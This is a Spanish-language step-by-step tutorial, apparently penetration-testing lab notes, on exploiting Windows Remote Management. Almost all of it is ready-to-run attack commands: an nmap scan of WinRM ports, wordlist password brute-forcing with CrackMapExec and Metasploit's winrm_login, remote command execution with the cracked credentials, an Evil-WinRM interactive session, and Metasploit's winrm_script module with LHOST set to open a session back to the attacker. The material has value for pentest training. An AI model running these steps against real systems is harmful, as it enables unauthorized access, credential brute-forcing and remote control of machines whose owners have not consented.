# Explotación de WinRM paso a paso

## 1️⃣ Identificar si el servicio WinRM está activo

Primero comprobamos que en los puertos 5985/5986 hay un servicio `Microsoft HTTPAPI` escuchando.

### Con Nmap:
```
nmap -p 5985,5986 -sV <IP_OBJETIVO>
```

Si aparece algo como:
```
5985/tcp open  http   Microsoft HTTPAPI httpd 2.0
```
significa que WinRM está habilitado.

---

## 2️⃣ Fuerza bruta con CrackMapExec

Probar contraseñas contra WinRM con una lista de contraseñas.

```
crackmapexec winrm <IP_OBJETIVO> -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```
## Por msfconsole

````
msfconsole -q
use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
exploit
````
Si encuentras una contraseña válida, puedes comprobarla directamente con un comando remoto.

---

## 3️⃣ Ejecutar un comando remoto con CrackMapExec

Usar credenciales encontradas para ejecutar un comando (`whoami`) vía WinRM:

```
crackmapexec winrm <IP_OBJETIVO> -u administrator -p <PASSWORD> -x "whoami"
```

---

## 4️⃣ Conectarse con Evil-WinRM

Establecer una sesión interactiva con Evil-WinRM:

```
evil-winrm -u administrator -p '<PASSWORD>' -i <IP_OBJETIVO>
```

Una vez dentro, puedes ejecutar comandos como:
```
ipconfig
```

---

## 5️⃣ Uso del módulo `winrm_script` en Metasploit

También puedes usar Metasploit para ejecutar scripts vía WinRM.

### Abrir Metasploit:
```
msfconsole
```

### Buscar y cargar el módulo:
```
search winrm_script
use 0
```

### Configurar las opciones:
```
set RHOSTS <IP_OBJETIVO>
set FORCE_VBS true
set USERNAME administrator
set PASSWORD <PASSWORD>
set LHOST <TU_IP>
exploit
```
